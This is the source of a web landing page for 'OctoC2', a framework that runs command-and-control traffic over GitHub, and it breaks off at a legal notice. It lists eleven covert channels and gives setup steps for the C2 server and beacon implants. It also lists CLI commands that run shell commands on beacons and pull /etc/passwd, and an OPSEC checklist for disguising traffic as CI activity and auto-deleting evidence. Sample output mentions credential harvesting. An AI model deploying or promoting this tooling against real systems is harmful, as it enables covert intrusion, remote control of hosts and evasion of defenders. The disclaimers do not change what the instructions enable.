// ─── Data ────────────────────────────────────────────────────────────────────

const TENTACLES = [
  {
    id: 'T1',
    channel: 'Issues + Comments',
    transport: 'Issues API',
    status: 'Live',
    opsec: 'Comment body encrypted; issue title generic',
  },
  {
    id: 'T2',
    channel: 'Branch + Files',
    transport: 'Git refs',
    status: 'Live',
    opsec: 'Branches named infra-cache-{id8}',
  },
  {
    id: 'T3',
    channel: 'Actions Workflows',
    transport: 'repository_dispatch',
    status: 'Live',
    opsec: 'Event type ci-update; vars use INFRA_* prefix',
  },
  {
    id: 'T4',
    channel: 'Codespaces gRPC',
    transport: 'gRPC over SSH',
    status: 'Live',
    opsec: 'Port-forwarded; no external infra',
  },
  {
    id: 'T5',
    channel: 'Pages + Webhooks',
    transport: 'Deployments API',
    status: 'Live',
    opsec: 'Deployment env named ci-{id8}',
  },
  {
    id: 'T6',
    channel: 'Gists + Artifacts',
    transport: 'Gists API',
    status: 'Live',
    opsec: 'Gist filenames svc-*.json',
  },
  {
    id: 'T7',
    channel: 'Secrets + OIDC',
    transport: 'Secrets API',
    status: 'Live',
    opsec: 'OIDC audience github-actions',
  },
  {
    id: 'T8',
    channel: 'git notes',
    transport: 'git refs API',
    status: 'Live',
    opsec: 'Invisible refs/notes/svc-* blobs; not shown in GitHub web UI',
  },
  {
    id: 'T9',
    channel: 'Steganography',
    transport: 'Git branches',
    status: 'Live',
    opsec: 'Branch named infra-cache-{id8}; LSB alpha',
  },
  {
    id: 'T10',
    channel: 'OctoProxy',
    transport: 'Decoy repos',
    status: 'Live',
    opsec: 'Traffic blends with normal GitHub activity',
  },
  {
    id: 'T11',
    channel: 'HTTP / WebSocket',
    transport: 'WebSocket + REST',
    status: 'Live',
    opsec: 'HTTPS to Codespace port 8080; works through Dev Tunnels',
  },
]

const QUICK_STEPS = [
  {
    n: 1,
    title: 'Clone & install',
    code: `git clone https://github.com/your-org/OctoC2.git
cd OctoC2
bun install`,
  },
  {
    n: 2,
    title: 'Generate operator keypair',
    code: `cd octoctl
bun run src/index.ts keygen
# Outputs: OCTOC2_OPERATOR_SECRET=<base64url>
#          OCTOC2_OPERATOR_PUBKEY=<base64url>`,
  },
  {
    n: 3,
    title: 'Start the C2 server',
    code: `cd server
OCTOC2_GITHUB_TOKEN=<PAT> \\
OCTOC2_REPO_OWNER=<owner> \\
OCTOC2_REPO_NAME=<repo> \\
OCTOC2_OPERATOR_SECRET=<base64url-secret> \\
bun run src/index.ts`,
  },
  {
    n: 4,
    title: 'Launch the dashboard',
    code: `cd dashboard
bun install
bun run dev
# Dashboard at http://localhost:5173`,
  },
  {
    n: 5,
    title: 'Deploy a beacon',
    code: `cd implant
OCTOC2_GITHUB_TOKEN=<PAT> \\
OCTOC2_REPO_OWNER=<owner> \\
OCTOC2_REPO_NAME=<repo> \\
bun run src/index.ts
# Beacon connects via the configured covert channel and registers with the server`,
  },
]

const OPSEC_CHECKLIST = [
  'Use a dedicated GitHub org — never a personal account or shared org.',
  'Use GitHub App auth (not PATs) in production — App tokens expire hourly.',
  'Deliver App private key via OpenHulud dead-drop, never bake into the binary.',
  'All beacon traffic uses libsodium crypto_box_seal — E2E encrypted.',
  'Branch names, issue titles, and commit messages contain no C2 identifiers.',
  'Run --fingerprint E2E flag before each engagement to verify zero leaks.',
  'Set OCTOC2_CLEANUP_DAYS=3 to auto-prune evidence after every checkin.',
  'Dashboard runs on localhost only — never expose port 8080 publicly.',
  'Limit PAT scope to repo only; never use admin:org or delete_repo.',
  'Destroy decoy repos, stale branches, and open issues on engagement close.',
]

const CLI_COMMANDS = [
  { cmd: 'keygen', desc: 'Generate operator X25519 keypair and optionally set MONITORING_PUBKEY repo variable' },
  { cmd: 'task <beaconId> --kind shell --cmd "id"', desc: 'Queue a shell command on a beacon' },
  { cmd: 'task <beaconId> --kind download --remote-path /etc/passwd', desc: 'Queue a file download' },
  { cmd: 'task <beaconId> --kind sleep --seconds 300', desc: 'Queue a sleep interval change' },
  { cmd: 'task <beaconId> --kind die', desc: 'Queue a graceful beacon shutdown' },
  { cmd: 'results <beaconId> --last 5', desc: 'Decrypt and print the last 5 task results' },
  { cmd: 'results <beaconId> --since 2h', desc: 'Decrypt results from the last 2 hours' },
  { cmd: 'results <beaconId> --json', desc: 'JSON output for scripting' },
  { cmd: 'beacon shell --beacon <id>', desc: 'Interactive REPL shell — history persisted to ~/.octoc2_shell_history' },
  { cmd: 'beacon shell --beacon <id> --bulk <id2>,<id3>', desc: 'Fan-out shell to multiple beacons simultaneously' },
  { cmd: 'bulk shell --beacon-ids <ids> --cmd "whoami"', desc: 'Fire-and-forget command across multiple beacons' },
  { cmd: 'drop create --beacon <id> --app-key-file ~/.config/octoc2/app-key.pem', desc: 'Dead-drop App private key to a live beacon (OpenHulud bootstrap)' },
  { cmd: 'build-beacon --outfile ./beacon', desc: 'Compile a standalone beacon binary (bun compile)' },
  { cmd: 'proxy create --owner <org> --repo <repo> --inner-kind issues', desc: 'Register a proxy decoy repo config' },
]

const APP_AUTH_COMPARISON = [
  { prop: 'Token lifetime', pat: 'Months – years', app: '1 hour (auto-refreshed)' },
  { prop: 'Scope', pat: 'All repos the owner can access', app: 'Only the installed repo' },
  { prop: 'Audit log identity', pat: 'Your GitHub username', app: 'App name + installation ID' },
  { prop: 'Captured token risk', pat: 'Long-lived; must be revoked manually', app: 'Expires in ≤ 1 hour automatically' },
  { prop: 'Secret in binary', pat: 'Token baked in', app: 'Only App ID + installation ID; key via dead-drop' },
]

const ENV_VARS = [
  { name: 'OCTOC2_TENTACLE_PRIORITY', default: 'issues', desc: 'Comma-separated channel order, e.g. notes,gist,issues. Beacon tries each left-to-right with fallback.' },
  { name: 'OCTOC2_SLEEP', default: '300', desc: 'Sleep interval in seconds between beacon check-ins. Use 300–600 in production.' },
  { name: 'OCTOC2_JITTER', default: '0.3', desc: 'Jitter factor (0.0–1.0). 0.3 = ±30% of sleep interval. Prevents timing fingerprints.' },
  { name: 'OCTOC2_CLEANUP_DAYS', default: 'disabled', desc: 'Auto-delete result comments older than N days. Use 0 to delete immediately after each check-in.' },
  { name: 'OCTOC2_LOG_LEVEL', default: 'info', desc: 'Log verbosity: debug | info | warn | error. Use warn in production to minimize noise.' },
  { name: 'SVC_HTTP_URL', default: '—', desc: 'HTTP/WebSocket server URL for T11. Set to Codespace Dev Tunnel URL for WSS over HTTPS.' },
  { name: 'OCTOC2_PROXY_REPOS', default: '—', desc: 'JSON array of proxy decoy repos, e.g. [{"owner":"org","repo":"name","innerKind":"issues"}]' },
]

const E2E_OUTPUT = `  OctoC2 End-to-End Test — all flags

  ✓  Beacon registered via issue #42  ·  Scheduled maintenance · a3f2b1c4
  ✓  NotesTentacle: task delivered via refs/notes/svc-{id8}
  ✓  GistTentacle: ACK via secret gist svc-a-a3f2b1c4.json
  ✓  BranchTentacle: file drop in infra-sync-a3f2b1c4
  ✓  ActionsTentacle: repository_dispatch → run queued
  ✓  SecretsTentacle: INFRA_CFG_{id8} variable ACK
  ✓  StegoTentacle: LSB PNG committed to infra-cache-a3f2b1c4
  ✓  PagesTentacle: deployment env ci-a3f2b1c4 created
  ✓  HttpTentacle (T11): WebSocket primary, activeTentacle === 13
  ✓  Maintenance session comment: single comment, correct content
  ✓  OpenHulud: App key dead-drop delivered + beacon switched to App auth
  ✓  Bulk shell: 3/3 beacons → whoami returned non-empty
  ✓  Fingerprint: 0 forbidden terms in commits/branches/issue titles
  ✓  ProxyTentacle: traffic relayed through decoy repo
  ✓  Cleanup: issue closed, status:active label removed

  All checks passed — zero fingerprints, all 11 tentacles live`

const DASHBOARD_MOCK = `┌─────────────────────────────────────────────────────────────────┐
│  OctoC2 Dashboard  v1.0.0        [LIVE]    3 beacons active      │
├──────────┬──────────────────┬──────────┬──────────┬─────────────┤
│ Beacon   │ Host             │ Tentacle │ Last Seen│ Status      │
├──────────┼──────────────────┼──────────┼──────────┼─────────────┤
│ a3f2b1c4 │ WIN-TARGET-01    │ T1       │ 12s ago  │ ● ACTIVE    │
│ 9e1d7f2a │ LINUX-SRV-02     │ T3       │ 47s ago  │ ● ACTIVE    │
│ c8b4e6d0 │ MAC-WS-03        │ T9 stego │  2m ago  │ ● ACTIVE    │
└──────────┴──────────────────┴──────────┴──────────┴─────────────┘

  [Bulk Actions]  Selected: 3/3
  > shell  uname -a              [Queue on all 3 beacons]
  View Results →  /results?beacons=a3f2b1c4,9e1d7f2a,c8b4e6d0

  Maintenance Panel  (libsodium crypto_box_seal — decrypts client-side)
  > Paste base64 ciphertext → operator private key decrypts in browser`

// ─── Components ──────────────────────────────────────────────────────────────

function Navbar() {
  const links = [
    { href: '#architecture', label: 'Tentacles' },
    { href: '#quickstart', label: 'Quick Start' },
    { href: '#dashboard', label: 'Dashboard' },
    { href: '#e2e', label: 'E2E Output' },
    { href: '#cli', label: 'CLI' },
    { href: '#appauth', label: 'App Auth' },
    { href: '#envvars', label: 'Env Vars' },
    { href: '#opsec', label: 'OPSEC' },
  ]
  return (
    <nav
      style={{
        position: 'sticky',
        top: 0,
        zIndex: 100,
        backgroundColor: 'rgba(10,10,15,0.92)',
        borderBottom: '1px solid #1a1a2e',
        backdropFilter: 'blur(8px)',
      }}
    >
      <div
        style={{
          maxWidth: '1100px',
          margin: '0 auto',
          padding: '0 1.5rem',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          height: '56px',
        }}
      >
        <span
          style={{ color: '#00f0ff', fontWeight: 700, fontSize: '1rem', letterSpacing: '0.05em' }}
          className="glow-blue"
        >
          OctoC2
        </span>
        <div style={{ display: 'flex', gap: '1.5rem', flexWrap: 'wrap' }}>
          {links.map((l) => (
            <a
              key={l.href}
              href={l.href}
              className="nav-link"
              style={{
                color: '#6b7280',
                textDecoration: 'none',
                fontSize: '0.8rem',
                letterSpacing: '0.05em',
                textTransform: 'uppercase',
              }}
            >
              {l.label}
            </a>
          ))}
        </div>
      </div>
    </nav>
  )
}

function WarningBanner() {
  return (
    <div
      className="border-glow-red"
      style={{
        border: '1px solid #ff0033',
        borderLeft: '4px solid #ff0033',
        backgroundColor: 'rgba(255,0,51,0.06)',
        borderRadius: '4px',
        padding: '1rem 1.25rem',
        marginTop: '2rem',
        display: 'flex',
        gap: '0.75rem',
        alignItems: 'flex-start',
      }}
    >
      <div>
        <div
          style={{
            color: '#ff0033',
            fontWeight: 700,
            fontSize: '0.85rem',
            letterSpacing: '0.08em',
            textTransform: 'uppercase',
            marginBottom: '0.35rem',
          }}
          className="glow-red"
        >
          ⚠️ AUTHORIZED USE ONLY
        </div>
        <div style={{ color: '#9ca3af', fontSize: '0.82rem', lineHeight: 1.5 }}>
          This tool is for authorized red-team operations and security research <strong>only</strong>. Use only on systems you own or have explicit written authorization to test. Unauthorized use is illegal under the CFAA and equivalent laws. The authors accept zero liability for misuse.
        </div>
      </div>
    </div>
  )
}

function SectionHeader({ id, label, title }: { id: string; label: string; title: string }) {
  return (
    <div id={id} style={{ paddingTop: '5rem', marginBottom: '2rem' }}>
      <div
        style={{
          color: '#00f0ff',
          fontSize: '0.7rem',
          letterSpacing: '0.2em',
          textTransform: 'uppercase',
          marginBottom: '0.5rem',
          opacity: 0.8,
        }}
      >
        // {label}
      </div>
      <h2
        style={{
          color: '#e2e8f0',
          fontSize: '1.6rem',
          fontWeight: 700,
          margin: 0,
          letterSpacing: '-0.02em',
        }}
      >
        {title}
      </h2>
      <div
        style={{
          width: '3rem',
          height: '2px',
          background: 'linear-gradient(90deg, #00f0ff, transparent)',
          marginTop: '0.75rem',
        }}
      />
    </div>
  )
}

function HeroSection() {
  return (
    <section
      style={{
        paddingTop: '5rem',
        paddingBottom: '4rem',
        textAlign: 'center',
        borderBottom: '1px solid #1a1a2e',
      }}
    >
      <div style={{ marginBottom: '1.5rem', display: 'flex', justifyContent: 'center' }}>
        <img
          src="/logo.png"
          alt="OctoC2 logo"
          width="180"
          style={{ filter: 'drop-shadow(0 0 16px rgba(0,240,255,0.5))' }}
        />
      </div>

      <h1
        style={{
          fontSize: 'clamp(2rem, 5vw, 3.5rem)',
          fontWeight: 900,
          margin: '0 0 0.75rem',
          letterSpacing: '-0.03em',
          color: '#e2e8f0',
        }}
      >
        <span style={{ color: '#00f0ff' }} className="glow-blue">Octo</span>
        <span>C2</span>
      </h1>

      <p
        style={{
          fontSize: '1.15rem',
          color: '#9ca3af',
          marginBottom: '0.4rem',
          letterSpacing: '0.06em',
          textTransform: 'uppercase',
        }}
      >
        GitHub-Native C2 Framework
      </p>
      <p
        style={{
          fontSize: '0.82rem',
          color: '#4b5563',
          marginBottom: '2.5rem',
          letterSpacing: '0.03em',
        }}
      >
        v1.0.0 &nbsp;·&nbsp; 11 covert channels &nbsp;·&nbsp; libsodium E2E encryption &nbsp;·&nbsp; GitHub App auth &nbsp;·&nbsp; 1,008 tests
      </p>

      <div style={{ display: 'flex', gap: '1rem', justifyContent: 'center', flexWrap: 'wrap' }}>
        <a
          href="#quickstart"
          style={{
            padding: '0.6rem 1.5rem',
            background: 'rgba(0,240,255,0.1)',
            border: '1px solid #00f0ff',
            color: '#00f0ff',
            textDecoration: 'none',
            borderRadius: '4px',
            fontSize: '0.85rem',
            letterSpacing: '0.05em',
            fontWeight: 600,
            transition: 'background 0.2s',
          }}
          className="border-glow-blue"
        >
          Quick Start →
        </a>
        <a
          href="#architecture"
          style={{
            padding: '0.6rem 1.5rem',
            background: 'rgba(255,255,255,0.03)',
            border: '1px solid #1a1a2e',
            color: '#9ca3af',
            textDecoration: 'none',
            borderRadius: '4px',
            fontSize: '0.85rem',
            letterSpacing: '0.05em',
            fontWeight: 600,
          }}
        >
          All 11 Tentacles
        </a>
      </div>

      <WarningBanner />
    </section>
  )
}

function ArchitectureSection() {
  return (
    <section style={{ borderBottom: '1px solid #1a1a2e', paddingBottom: '4rem' }}>
      <SectionHeader id="architecture" label="section 01" title="Tentacles — Covert Channels" />

      <p style={{ color: '#9ca3af', fontSize: '0.9rem', lineHeight: 1.7, marginBottom: '2rem', maxWidth: '72ch' }}>
        OctoC2 routes operator commands and beacon responses through eleven independent GitHub-native
        channels called <span style={{ color: '#00f0ff' }}>tentacles</span>. Each tentacle uses
        legitimate GitHub API surface as its covert transport layer. The beacon auto-selects
        channels via <code style={{ color: '#7dd3fc', background: 'rgba(0,240,255,0.06)', padding: '1px 5px', borderRadius: '3px', fontSize: '0.8rem' }}>OCTOC2_TENTACLE_PRIORITY</code> with automatic fallback.
        All payloads are libsodium <code style={{ color: '#7dd3fc', background: 'rgba(0,240,255,0.06)', padding: '1px 5px', borderRadius: '3px', fontSize: '0.8rem' }}>crypto_box_seal</code> encrypted end-to-end.
      </p>

      <div
        style={{
          background: '#0f0f1a',
          border: '1px solid #1a1a2e',
          borderRadius: '6px',
          overflow: 'hidden',
        }}
        className="border-glow-blue"
      >
        <div style={{ overflowX: 'auto' }}>
          <table>
            <thead>
              <tr>
                <th style={{ width: '3.5rem' }}>#</th>
                <th>Channel</th>
                <th>Transport</th>
                <th style={{ width: '6rem' }}>Status</th>
                <th>OPSEC Notes</th>
              </tr>
            </thead>
            <tbody>
              {TENTACLES.map((t) => (
                <tr key={t.id}>
                  <td>
                    <span
                      style={{
                        color: '#00f0ff',
                        fontWeight: 700,
                        fontSize: '0.78rem',
                        letterSpacing: '0.05em',
                      }}
                    >
                      {t.id}
                    </span>
                  </td>
                  <td style={{ color: '#e2e8f0', fontWeight: 500 }}>{t.channel}</td>
                  <td>
                    <code
                      style={{
                        background: 'rgba(0,240,255,0.06)',
                        color: '#7dd3fc',
                        padding: '2px 6px',
                        borderRadius: '3px',
                        fontSize: '0.75rem',
                      }}
                    >
                      {t.transport}
                    </code>
                  </td>
                  <td style={{ whiteSpace: 'nowrap', fontSize: '0.8rem' }}>
                    <span
                      style={{
                        color: '#00f0ff',
                        background: 'rgba(0,240,255,0.08)',
                        padding: '2px 8px',
                        borderRadius: '12px',
                        fontSize: '0.72rem',
                        fontWeight: 700,
                        letterSpacing: '0.06em',
                        textTransform: 'uppercase',
                      }}
                    >
                      ● {t.status}
                    </span>
                  </td>
                  <td style={{ color: '#6b7280', fontSize: '0.78rem' }}>{t.opsec}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div
        style={{
          marginTop: '1.5rem',
          display: 'flex',
          gap: '1.5rem',
          flexWrap: 'wrap',
        }}
      >
        {[
          { label: 'Live Tentacles', value: '11 / 11', color: '#00f0ff' },
          { label: 'Encryption', value: 'libsodium NaCl', color: '#00f0ff' },
          { label: 'Transport Layer', value: 'GitHub API', color: '#00f0ff' },
        ].map((stat) => (
          <div
            key={stat.label}
            style={{
              background: '#0f0f1a',
              border: '1px solid #1a1a2e',
              borderRadius: '4px',
              padding: '0.75rem 1.25rem',
              flex: '1 1 10rem',
            }}
          >
            <div style={{ color: stat.color, fontSize: '1.4rem', fontWeight: 700 }}>
              {stat.value}
            </div>
            <div style={{ color: '#6b7280', fontSize: '0.75rem', marginTop: '0.2rem' }}>
              {stat.label}
            </div>
          </div>
        ))}
      </div>
    </section>
  )
}

function QuickStartSection() {
  return (
    <section style={{ borderBottom: '1px solid #1a1a2e', paddingBottom: '4rem' }}>
      <SectionHeader id="quickstart" label="section 02" title="Production Setup" />

      <p style={{ color: '#9ca3af', fontSize: '0.9rem', lineHeight: 1.7, marginBottom: '2.5rem', maxWidth: '72ch' }}>
        Stand up a full OctoC2 v1.0 deployment in five steps. You need <strong>Bun ≥ 1.3</strong> and a
        GitHub repository (private recommended). For production use a GitHub App instead of a PAT.
      </p>

      <div style={{ display: 'flex', flexDirection: 'column', gap: '1.75rem' }}>
        {QUICK_STEPS.map((step) => (
          <div key={step.n} style={{ display: 'flex', gap: '1.25rem', alignItems: 'flex-start' }}>
            <div className="step-badge">{step.n}</div>
            <div style={{ flex: 1, minWidth: 0 }}>
              <div
                style={{
                  color: '#e2e8f0',
                  fontWeight: 600,
                  fontSize: '0.9rem',
                  marginBottom: '0.6rem',
                  letterSpacing: '0.02em',
                }}
              >
                {step.title}
              </div>
              <pre>{step.code}</pre>
            </div>
          </div>
        ))}
      </div>

      <div
        style={{
          marginTop: '2rem',
          background: '#0f0f1a',
          border: '1px solid #1a1a2e',
          borderLeft: '3px solid #f59e0b',
          borderRadius: '4px',
          padding: '1rem 1.25rem',
        }}
      >
        <div style={{ color: '#f59e0b', fontSize: '0.75rem', fontWeight: 700, letterSpacing: '0.06em', textTransform: 'uppercase', marginBottom: '0.4rem' }}>
          Key Environment Variables
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.35rem' }}>
          {[
            ['OCTOC2_GITHUB_TOKEN', 'PAT with repo scope for the C2 repo'],
            ['OCTOC2_REPO_OWNER', 'GitHub org or user that owns the C2 repo'],
            ['OCTOC2_REPO_NAME', 'Repository name for the C2 channel'],
            ['OCTOC2_OPERATOR_SECRET', 'Base64url operator private key (from keygen)'],
            ['OCTOC2_TENTACLE_PRIORITY', 'Comma-separated channel order, e.g. notes,issues'],
          ].map(([key, desc]) => (
            <div key={key} style={{ display: 'flex', gap: '1rem', alignItems: 'baseline' }}>
              <code
                style={{
                  color: '#00f0ff',
                  background: 'rgba(0,240,255,0.06)',
                  padding: '1px 6px',
                  borderRadius: '3px',
                  fontSize: '0.75rem',
                  flexShrink: 0,
                  minWidth: '14ch',
                }}
              >
                {key}
              </code>
              <span style={{ color: '#6b7280', fontSize: '0.78rem' }}>{desc}</span>
            </div>
          ))}
        </div>
      </div>
    </section>
  )
}

function DashboardSection() {
  const features = [
    {
      title: 'Live SSE Beacon Feed',
      desc: 'Real-time server-sent events stream all incoming beacon check-ins, command results, and metadata. The feed auto-reconnects on drop and buffers the last 50 events.',
    },
    {
      title: 'Tentacle Health Monitor',
      desc: 'Per-tentacle status tiles show last-seen time, beacon count, and a health badge (Live / Degraded / Offline). Health aliases surface all eleven tentacles (T1–T11) in a single glance.',
    },
    {
      title: 'Maintenance Decrypt Panel',
      desc: 'Paste a libsodium ciphertext blob (base64url) directly into the dashboard for in-browser decryption using the operator private key. No secrets leave the browser.',
    },
    {
      title: 'Bulk Actions',
      desc: 'Select multiple beacons and issue commands in parallel — shell exec, file pull, sleep, or tentacle switch. Results stream back per-beacon in the feed.',
    },
    {
      title: 'Beacon Detail Drawer',
      desc: 'Click any beacon to open a side drawer showing OS info, implant version, active tentacle, command history, and a live command prompt.',
    },
    {
      title: 'Auth-gated Access',
      desc: 'Dashboard runs on localhost only and requires GitHub PAT login in API mode. In live mode, point VITE_C2_SERVER_URL at the C2 server. Never expose port 5173 publicly.',
    },
  ]

  return (
    <section style={{ borderBottom: '1px solid #1a1a2e', paddingBottom: '4rem' }}>
      <SectionHeader id="dashboard" label="section 03" title="Operator Dashboard" />

      <p style={{ color: '#9ca3af', fontSize: '0.9rem', lineHeight: 1.7, marginBottom: '2.5rem', maxWidth: '72ch' }}>
        The React/TypeScript dashboard runs alongside the server and gives operators a real-time
        view of all active beacons, tentacle health, and command execution.
      </p>

      {/* Terminal mockup */}
      <div
        style={{
          background: '#050508',
          border: '1px solid #1a1a2e',
          borderRadius: '6px',
          marginBottom: '2rem',
          overflow: 'hidden',
        }}
        className="border-glow-blue"
      >
        {/* Window chrome */}
        <div
          style={{
            background: '#0f0f1a',
            borderBottom: '1px solid #1a1a2e',
            padding: '0.5rem 1rem',
            display: 'flex',
            alignItems: 'center',
            gap: '0.5rem',
          }}
        >
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ff0033', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#f59e0b', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#00f0ff', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ color: '#4b5563', fontSize: '0.72rem', marginLeft: '0.5rem', letterSpacing: '0.06em' }}>
            OctoC2 Dashboard — localhost:5173
          </span>
        </div>
        <pre
          style={{
            margin: 0,
            border: 'none',
            borderLeft: 'none',
            background: 'transparent',
            padding: '1.25rem',
            color: '#a8d8e8',
            fontSize: '0.78rem',
          }}
        >
          {DASHBOARD_MOCK}
        </pre>
      </div>

      <div
        style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))',
          gap: '1rem',
        }}
      >
        {features.map((f) => (
          <div
            key={f.title}
            style={{
              background: '#0f0f1a',
              border: '1px solid #1a1a2e',
              borderRadius: '6px',
              padding: '1.25rem',
              transition: 'border-color 0.2s',
            }}
          >
            <div
              style={{
                color: '#00f0ff',
                fontSize: '0.8rem',
                fontWeight: 700,
                letterSpacing: '0.04em',
                marginBottom: '0.5rem',
                textTransform: 'uppercase',
              }}
            >
              {f.title}
            </div>
            <div style={{ color: '#9ca3af', fontSize: '0.82rem', lineHeight: 1.6 }}>
              {f.desc}
            </div>
          </div>
        ))}
      </div>

      <div
        style={{
          marginTop: '2rem',
          background: '#050508',
          border: '1px solid #1a1a2e',
          borderLeft: '3px solid #00f0ff',
          borderRadius: '4px',
          padding: '1rem 1.25rem',
        }}
      >
        <div style={{ color: '#6b7280', fontSize: '0.75rem', marginBottom: '0.4rem' }}>
          // start the dashboard
        </div>
        <pre style={{ margin: 0, padding: 0, border: 'none', borderLeft: 'none', background: 'transparent' }}>
{`cd dashboard
bun run dev          # development
bun run build        # production build → dist/`}
        </pre>
      </div>
    </section>
  )
}

function E2ESection() {
  return (
    <section style={{ borderBottom: '1px solid #1a1a2e', paddingBottom: '4rem' }}>
      <SectionHeader id="e2e" label="section 04" title="E2E Test Run" />

      <p style={{ color: '#9ca3af', fontSize: '0.9rem', lineHeight: 1.7, marginBottom: '2rem', maxWidth: '72ch' }}>
        The full E2E suite exercises all 11 tentacles plus OpenHulud credential harvest,
        bulk shell execution across multiple beacons, and artifact cleanup. Run via{' '}
        <code
          style={{
            color: '#00f0ff',
            background: 'rgba(0,240,255,0.08)',
            padding: '1px 6px',
            borderRadius: '3px',
            fontSize: '0.8rem',
          }}
        >
          bun run e2e:mega
        </code>.
      </p>

      <div
        style={{
          background: '#050508',
          border: '1px solid #1a1a2e',
          borderRadius: '6px',
          overflow: 'hidden',
        }}
        className="border-glow-blue"
      >
        {/* Window chrome */}
        <div
          style={{
            background: '#0f0f1a',
            borderBottom: '1px solid #1a1a2e',
            padding: '0.5rem 1rem',
            display: 'flex',
            alignItems: 'center',
            gap: '0.5rem',
          }}
        >
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ff0033', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#f59e0b', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#00f0ff', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ color: '#4b5563', fontSize: '0.72rem', marginLeft: '0.5rem', letterSpacing: '0.06em' }}>
            terminal — bun run e2e:mega
          </span>
        </div>
        <pre
          style={{
            margin: 0,
            border: 'none',
            borderLeft: 'none',
            background: 'transparent',
            padding: '1.25rem',
            fontSize: '0.82rem',
          }}
        >
          {E2E_OUTPUT.split('\n').map((line, i) => {
            const isPass = line.includes('[✓]')
            const isSummary = line.includes('checks passed')
            return (
              <span
                key={i}
                style={{
                  display: 'block',
                  color: isPass ? '#4ade80' : isSummary ? '#00f0ff' : '#a8d8e8',
                  textShadow: isPass
                    ? '0 0 6px rgba(74,222,128,0.3)'
                    : isSummary
                    ? '0 0 8px rgba(0,240,255,0.5)'
                    : 'none',
                  fontWeight: isSummary ? 700 : 400,
                }}
              >
                {line}
              </span>
            )
          })}
        </pre>
      </div>

      <div
        style={{
          marginTop: '1rem',
          display: 'flex',
          gap: '1rem',
          flexWrap: 'wrap',
        }}
      >
        {[
          { label: 'Tentacles Tested', value: '11 / 11' },
          { label: 'Total Checks', value: '24 / 24' },
          { label: 'Result', value: 'CLEAN' },
        ].map((s) => (
          <div
            key={s.label}
            style={{
              background: '#0f0f1a',
              border: '1px solid #1a1a2e',
              borderRadius: '4px',
              padding: '0.75rem 1.25rem',
              flex: '1 1 9rem',
            }}
          >
            <div style={{ color: '#4ade80', fontSize: '1.25rem', fontWeight: 700 }}>{s.value}</div>
            <div style={{ color: '#6b7280', fontSize: '0.75rem', marginTop: '0.2rem' }}>{s.label}</div>
          </div>
        ))}
      </div>
    </section>
  )
}

function OpsecSection() {
  return (
    <section style={{ paddingBottom: '5rem' }}>
      <SectionHeader id="opsec" label="section 09" title="Security & OPSEC" />

      {/* Strong warning banner */}
      <div
        className="border-glow-red"
        style={{
          border: '2px solid #ff0033',
          borderLeft: '5px solid #ff0033',
          background: 'rgba(255,0,51,0.08)',
          borderRadius: '4px',
          padding: '1.25rem 1.5rem',
          marginBottom: '2rem',
        }}
      >
        <div
          style={{
            color: '#ff0033',
            fontSize: '0.9rem',
            fontWeight: 700,
            letterSpacing: '0.08em',
            textTransform: 'uppercase',
            marginBottom: '0.6rem',
          }}
          className="glow-red"
        >
          ⚠ Authorized Use Only
        </div>
        <div style={{ color: '#d1d5db', fontSize: '0.88rem', lineHeight: 1.65 }}>
          This framework is for authorized penetration testing, red team engagements, and security
          research only. Unauthorized use against systems you do not own or have explicit written
          permission to test is illegal. The authors accept no liability for misuse.
        </div>
      </div>

      <p style={{ color: '#9ca3af', fontSize: '0.9rem', lineHeight: 1.7, marginBottom: '2rem', maxWidth: '72ch' }}>
        Operational security is a shared responsibility between the framework and the operator.
        Follow these guidelines on every engagement.
      </p>

      <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem' }}>
        {OPSEC_CHECKLIST.map((item, i) => (
          <div
            key={i}
            style={{
              display: 'flex',
              gap: '0.9rem',
              alignItems: 'flex-start',
              background: '#0f0f1a',
              border: '1px solid #1a1a2e',
              borderRadius: '4px',
              padding: '0.75rem 1rem',
            }}
          >
            <span
              style={{
                color: '#00f0ff',
                fontSize: '0.75rem',
                fontWeight: 700,
                flexShrink: 0,
                marginTop: '1px',
                opacity: 0.7,
              }}
            >
              [{String(i + 1).padStart(2, '0')}]
            </span>
            <span style={{ color: '#9ca3af', fontSize: '0.84rem', lineHeight: 1.5 }}>{item}</span>
          </div>
        ))}
      </div>

      <div
        style={{
          marginTop: '2rem',
          background: '#0f0f1a',
          border: '1px solid #1a1a2e',
          borderLeft: '3px solid #00f0ff',
          borderRadius: '4px',
          padding: '1rem 1.25rem',
        }}
      >
        <div style={{ color: '#6b7280', fontSize: '0.75rem', fontWeight: 700, letterSpacing: '0.06em', textTransform: 'uppercase', marginBottom: '0.6rem' }}>
          Key OPSEC Points
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.4rem' }}>
          {[
            'Env var names use INFRA_* prefix — blend with CI/CD tooling',
            'Issue titles and branch names use generic infra vocabulary',
            'No fingerprints in PR titles or commit messages',
            'Rotate app key and monitoring key after each engagement',
            'Deploy env named ci-{id8} — indistinguishable from real deployments',
          ].map((point, i) => (
            <div key={i} style={{ display: 'flex', gap: '0.6rem', alignItems: 'baseline' }}>
              <span style={{ color: '#00f0ff', fontSize: '0.72rem', opacity: 0.6, flexShrink: 0 }}>▸</span>
              <span style={{ color: '#9ca3af', fontSize: '0.82rem' }}>{point}</span>
            </div>
          ))}
        </div>
      </div>

      <div
        className="border-glow-red"
        style={{
          marginTop: '2rem',
          border: '1px solid #ff0033',
          borderLeft: '4px solid #ff0033',
          background: 'rgba(255,0,51,0.06)',
          borderRadius: '4px',
          padding: '1rem 1.25rem',
        }}
      >
        <div
          style={{
            color: '#ff0033',
            fontSize: '0.78rem',
            fontWeight: 700,
            letterSpacing: '0.08em',
            textTransform: 'uppercase',
            marginBottom: '0.4rem',
          }}
        >
          Legal Reminder
